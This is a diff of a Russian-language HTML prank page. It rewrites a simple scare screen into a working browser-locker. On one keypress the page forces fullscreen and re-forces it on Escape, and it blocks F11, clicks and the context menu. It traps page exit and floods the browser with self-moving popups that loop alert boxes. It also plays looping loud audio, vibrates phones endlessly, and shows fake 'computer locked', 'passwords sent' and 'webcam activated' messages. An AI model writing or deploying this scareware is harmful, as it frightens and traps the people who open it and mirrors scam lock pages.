@@ -2,133 +2,453 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Страшный сайт</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAKE UP</title>
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
-            background: black;
-            color: white;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
             font-family: 'Courier New', monospace;
-            text-align: center;
-            cursor: none; /* Спрячем курсор для большего эффекта */
-        }
-        #scaryScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
             height: 100vh;
-            background: radial-gradient(circle, red, black);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            font-size: 5em;
-            z-index: 1000;
-            animation: shake 0.1s infinite; /* Тряска */
+            overflow: hidden;
+            cursor: none;
         }
-        @keyframes shake {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            10% { transform: translate(-1px, -2px) rotate(-1deg); }
-            20% { transform: translate(-3px, 0px) rotate(1deg); }
-            30% { transform: translate(3px, 2px) rotate(0deg); }
-            40% { transform: translate(1px, -1px) rotate(1deg); }
-            50% { transform: translate(-1px, 2px) rotate(-1deg); }
-            60% { transform: translate(-3px, 1px) rotate(0deg); }
-            70% { transform: translate(3px, 1px) rotate(-1deg); }
-            80% { transform: translate(-1px, -1px) rotate(1deg); }
-            90% { transform: translate(1px, 2px) rotate(0deg); }
-            100% { transform: translate(1px, -2px) rotate(-1deg); }
-        }
-        #triggerArea {
-            position: absolute;
+
+        #startScreen {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><text x="10" y="20" fill="white">Не нажимай</text></svg>');
-            z-index: 10;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
         }
-        .warning {
-            position: relative;
-            z-index: 20;
-            padding-top: 20%;
-            text-shadow: 0 0 10px red;
+
+        .startText {
+            font-size: 5rem;
+            border: 3px solid #fff;
+            padding: 2rem 4rem;
+            animation: flash 0.5s infinite;
+        }
+
+        @keyframes flash {
+            0% { opacity: 1; background: #000; }
+            50% { opacity: 0.2; background: #fff; color: #000; }
+            100% { opacity: 1; background: #000; }
+        }
+
+        .blackSquare {
+            position: fixed;
+            background: #000;
+            border: 1px solid #fff;
+            z-index: 5000;
+            pointer-events: none;
+        }
+
+        .windowOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 2000;
+            pointer-events: none;
+        }
+
+        .virusWindow {
+            position: fixed;
+            background: #000;
+            border: 3px solid #f00;
+            box-shadow: 0 0 50px #f00;
+            min-width: 300px;
+            max-width: 600px;
+            z-index: 9000;
+            color: #f00;
+            resize: both;
+            overflow: hidden;
+            animation: windowPulse 0.2s infinite;
+        }
+
+        @keyframes windowPulse {
+            0% { border-color: #f00; box-shadow: 0 0 30px #f00; }
+            50% { border-color: #fff; box-shadow: 0 0 60px #fff; }
+            100% { border-color: #f00; box-shadow: 0 0 30px #f00; }
+        }
+
+        .windowHeader {
+            background: #300;
+            padding: 10px;
+            border-bottom: 2px solid #f00;
+            color: #f00;
+            font-size: 1.2rem;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            text-transform: uppercase;
+        }
+
+        .windowClose {
+            color: #f00;
+            cursor: pointer;
+            font-size: 1.5rem;
+            padding: 0 10px;
+        }
+        .windowClose:hover {
+            color: #fff;
+            background: #f00;
+        }
+
+        .windowContent {
+            padding: 20px;
+            background: #000;
+            color: #f00;
+            font-size: 1.2rem;
+            line-height: 1.8;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .fullscreenMessage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.1);
+            z-index: 9500;
+            pointer-events: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 3rem;
+            color: #f00;
+            text-shadow: 0 0 30px #f00;
+            animation: textFlash 0.1s infinite;
+        }
+
+        @keyframes textFlash {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .cursorNone {
+            cursor: none;
         }
     </style>
 </head>
 <body>
-    <div class="warning" id="startText">
-        <h1>👻 НЕ НАЖИМАЙ ПРОБЕЛ 👻</h1>
-        <p>(шучу, нажми)</p>
+    <div id="startScreen">
+        <div class="startText">НАЖМИ ПРОБЕЛ</div>
     </div>
 
-    <!-- Невидимая зона на весь экран для ловли пробела -->
-    <div id="triggerArea" tabindex="0"></div>
+    <div id="windowContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:2000;"></div>
 
-    <!-- Страшный экран (появляется после активации) -->
-    <div id="scaryScreen">
-        💀 ТЫ ПОПАЛСЯ 💀
-    </div>
-
-    <audio id="screamSound" src="https://www.myinstants.com/media/sounds/scary-scream.mp3" preload="auto"></audio>
+    <audio id="screamAudio" loop preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/evanescence-bring-me-to-life_3.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
-        const triggerArea = document.getElementById('triggerArea');
-        const scaryScreen = document.getElementById('scaryScreen');
-        const scream = document.getElementById('screamSound');
-        const body = document.body;
+        (function() {
+            const startScreen = document.getElementById('startScreen');
+            const windowContainer = document.getElementById('windowContainer');
+            const scream = document.getElementById('screamAudio');
+            
+            let active = false;
+            let windowCount = 0;
+            const maxWindows = 50;
+            let intervals = [];
 
-        // Фокусируемся на зоне, чтобы ловить клавиши
-        triggerArea.focus();
-
-        triggerArea.addEventListener('keydown', function(e) {
-            if (e.code === 'Space') {
-                e.preventDefault(); // Отключаем стандартное поведение пробела (скролл)
-                activateScaryMode();
-            }
-        });
-
-        // Для мобильных — нажатие на экран
-        triggerArea.addEventListener('click', function() {
-            activateScaryMode();
-        });
-
-        function activateScaryMode() {
-            // 1. Прячем стартовый текст
-            document.getElementById('startText').style.display = 'none';
-
-            // 2. Показываем страшный экран
-            scaryScreen.style.display = 'flex';
-
-            // 3. Пытаемся включить полноэкранный режим
-            if (body.requestFullscreen) {
-                body.requestFullscreen();
-            } else if (body.webkitRequestFullscreen) { /* Safari */
-                body.webkitRequestFullscreen();
-            } else if (body.msRequestFullscreen) { /* IE/Edge */
-                body.msRequestFullscreen();
-            }
-
-            // 4. Включаем звук (важно: нужно взаимодействие пользователя)
-            scream.play().catch(error => {
-                console.log("Автовоспроизведение заблокировано браузером:", error);
-                // Можно показать сообщение "Нажми еще раз", если звук не включился
-            });
-
-            // 5. Вибрация на мобильных
-            if (navigator.vibrate) {
-                navigator.vibrate([500, 200, 500]); // Вибрация: 500мс, пауза, 500мс
-            }
-
-            // 6. Не даем легко закрыть (ловим клавишу Escape)
-            document.addEventListener('keydown', function trapEscape(e) {
-                if (e.key === 'Escape') {
+            document.addEventListener('keydown', function(e) {
+                if (e.code === 'Space' && !active) {
                     e.preventDefault();
-                    // Можно снова запросить fullscreen или просто игнорировать
+                    activate();
                 }
             });
-        }
+
+            startScreen.addEventListener('click', function() {
+                if (!active) activate();
+            });
+
+            function activate() {
+                active = true;
+                startScreen.style.display = 'none';
+
+                // Fullscreen любой ценой
+                try {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    } else if (document.documentElement.webkitRequestFullscreen) {
+                        document.documentElement.webkitRequestFullscreen();
+                    } else if (document.documentElement.msRequestFullscreen) {
+                        document.documentElement.msRequestFullscreen();
+                    }
+                } catch(e) {}
+
+                // Звук на всю
+                if (scream) {
+                    scream.volume = 1.0;
+                    scream.play().catch(() => {});
+                }
+
+                // Вибрация на телефонах
+                if (navigator.vibrate) {
+                    setInterval(() => {
+                        navigator.vibrate([200, 100, 200, 100, 200, 100, 200]);
+                    }, 1000);
+                }
+
+                // Запрет на закрытие
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    return '';
+                });
+
+                // Блокировка ESC
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape') {
+                        e.preventDefault();
+                        try {
+                            if (document.documentElement.requestFullscreen) {
+                                document.documentElement.requestFullscreen();
+                            }
+                        } catch(e) {}
+                    }
+                    if (e.key === 'F11') {
+                        e.preventDefault();
+                    }
+                });
+
+                // Чёрные квадраты заполняют экран
+                setInterval(() => {
+                    for (let i = 0; i < 5; i++) {
+                        const square = document.createElement('div');
+                        square.className = 'blackSquare';
+                        const size = 20 + Math.random() * 100;
+                        square.style.width = size + 'px';
+                        square.style.height = size + 'px';
+                        square.style.left = Math.random() * 100 + '%';
+                        square.style.top = Math.random() * 100 + '%';
+                        square.style.background = Math.random() > 0.5 ? '#000' : '#f00';
+                        square.style.opacity = Math.random() * 0.8;
+                        square.style.zIndex = 1000 + Math.floor(Math.random() * 1000);
+                        document.body.appendChild(square);
+                    }
+                }, 100);
+
+                // Массовое открытие окон
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        openWindowFlood();
+                    }, i * 200);
+                }
+
+                intervals.push(setInterval(openWindowFlood, 300));
+                intervals.push(setInterval(createDraggableWindow, 500));
+                intervals.push(setInterval(() => {
+                    for (let i = 0; i < 3; i++) {
+                        createDraggableWindow();
+                    }
+                }, 1000));
+
+                // Сообщение поверх всего
+                const msg = document.createElement('div');
+                msg.className = 'fullscreenMessage';
+                msg.innerHTML = '💀 ВЫ ЗАРАЖЕНЫ 💀';
+                document.body.appendChild(msg);
+
+                // Перемещение мыши
+                document.addEventListener('mousemove', function(e) {
+                    if (Math.random() > 0.7) {
+                        e.preventDefault();
+                        window.scrollTo(Math.random() * 100, Math.random() * 100);
+                    }
+                });
+
+                // Блокировка кликов
+                document.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    for (let i = 0; i < 3; i++) {
+                        setTimeout(createDraggableWindow, i * 50);
+                    }
+                }, true);
+
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                });
+            }
+
+            function openWindowFlood() {
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        const left = 50 + (i * 30);
+                        const top = 50 + (i * 20);
+                        const w = window.open('', '_blank', `width=300,height=200,left=${left},top=${top}`);
+                        
+                        if (w && !w.closed) {
+                            w.document.write(`
+                                <html>
+                                <head>
+                                    <title>⚠️ КРИТИЧЕСКАЯ ОШИБКА ⚠️</title>
+                                    <style>
+                                        body {
+                                            background: #000;
+                                            color: #f00;
+                                            font-family: monospace;
+                                            font-size: 20px;
+                                            margin: 20px;
+                                            text-transform: uppercase;
+                                            animation: blink 0.1s infinite;
+                                        }
+                                        @keyframes blink {
+                                            0% { background: #000; color: #f00; }
+                                            50% { background: #f00; color: #000; }
+                                            100% { background: #000; color: #f00; }
+                                        }
+                                        button {
+                                            background: #f00;
+                                            color: #000;
+                                            font-size: 20px;
+                                            padding: 10px;
+                                            border: none;
+                                            cursor: pointer;
+                                            width: 100%;
+                                            margin: 5px 0;
+                                        }
+                                        button:hover {
+                                            background: #fff;
+                                        }
+                                    </style>
+                                </head>
+                                <body>
+                                    <script>
+                                        setInterval(() => {
+                                            alert('НЕВОЗМОЖНО ЗАКРЫТЬ');
+                                        }, 500);
+                                    <\/script>
+                                    <h1>💀 ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН 💀</h1>
+                                    <p>Код ошибки: 0x${Math.floor(Math.random()*1000000).toString(16)}</p>
+                                    <p>Система: Windows ${Math.floor(Math.random()*10)}</p>
+                                    <button onclick="window.close()">ЗАКРЫТЬ (НЕ РАБОТАЕТ)</button>
+                                    <button onclick="window.open('', '_blank')">ОТКРЫТЬ ЕЩЁ</button>
+                                    <script>
+                                        setInterval(() => {
+                                            window.moveTo(Math.random()*100, Math.random()*100);
+                                            window.resizeTo(300+Math.random()*200, 200+Math.random()*200);
+                                        }, 100);
+                                    <\/script>
+                                </body>
+                                </html>
+                            `);
+                            
+                            windowCount++;
+                        }
+                    } catch(e) {}
+                }
+            }
+
+            function createDraggableWindow() {
+                if (windowCount > maxWindows) return;
+                
+                const win = document.createElement('div');
+                win.className = 'virusWindow';
+                win.style.pointerEvents = 'auto';
+                
+                const titles = [
+                    'СИСТЕМА ЗАРАЖЕНА', 'ТРОЯН ACTIVATED', 'DIPLOMAT.EXE',
+                    'КРИТИЧЕСКАЯ ОШИБКА', 'ВЗЛОМ', 'ДОСТУП ПОЛУЧЕН',
+                    'УДАЛЕНИЕ SYSTEM32', 'ШИФРОВАНИЕ ДИСКА', 'НЕВОЗМОЖНО ЗАКРЫТЬ'
+                ];
+                
+                const header = document.createElement('div');
+                header.className = 'windowHeader';
+                header.innerHTML = `
+                    <span>${titles[Math.floor(Math.random() * titles.length)]}</span>
+                    <span class="windowClose" onclick="this.parentElement.parentElement.remove()">✖</span>
+                `;
+                
+                const content = document.createElement('div');
+                content.className = 'windowContent';
+                
+                const messages = [
+                    `⚠️ ВНИМАНИЕ! ОБНАРУЖЕН ВИРУС!`,
+                    `🔥 ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН 🔥`,
+                    `💣 УДАЛЕНИЕ ФАЙЛОВ: 25%`,
+                    `👁️ ВЕБ-КАМЕРА АКТИВИРОВАНА`,
+                    `📸 СДЕЛАНО ФОТО: 154`,
+                    `🔑 ПАРОЛИ ОТПРАВЛЕНЫ`,
+                    `💀 ВЫ НИЧЕГО НЕ СМОЖЕТЕ СДЕЛАТЬ`,
+                    `🎵 WAKE ME UP INSIDE`,
+                    `🖥️ IP: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                ];
+                
+                content.textContent = messages[Math.floor(Math.random() * messages.length)] + ' ' + '█'.repeat(20);
+                
+                win.appendChild(header);
+                win.appendChild(content);
+                
+                win.style.left = Math.random() * 70 + '%';
+                win.style.top = Math.random() * 70 + '%';
+                win.style.width = 300 + Math.random() * 200 + 'px';
+                
+                document.body.appendChild(win);
+                windowCount++;
+                
+                makeDraggable(win, header);
+                
+                setInterval(() => {
+                    if (win.parentNode) {
+                        win.style.left = (parseFloat(win.style.left) + (Math.random() - 0.5) * 20) + '%';
+                        win.style.top = (parseFloat(win.style.top) + (Math.random() - 0.5) * 20) + '%';
+                    }
+                }, 500);
+                
+                setTimeout(() => {
+                    if (win.parentNode && Math.random() > 0.3) {
+                        win.remove();
+                        windowCount--;
+                    }
+                }, 5000);
+            }
+
+            function makeDraggable(el, handle) {
+                let x1, y1, x2, y2;
+                handle.onmousedown = (e) => {
+                    e.preventDefault();
+                    x2 = e.clientX;
+                    y2 = e.clientY;
+                    document.onmouseup = () => {
+                        document.onmouseup = null;
+                        document.onmousemove = null;
+                    };
+                    document.onmousemove = (e) => {
+                        e.preventDefault();
+                        x1 = x2 - e.clientX;
+                        y1 = y2 - e.clientY;
+                        x2 = e.clientX;
+                        y2 = e.clientY;
+                        el.style.top = (el.offsetTop - y1) + 'px';
+                        el.style.left = (el.offsetLeft - x1) + 'px';
+                    };
+                };
+            }
+
+            window.addEventListener('beforeunload', (e) => {
+                intervals.forEach(i => clearInterval(i));
+            });
+        })();
     </script>
 </body>
 </html>
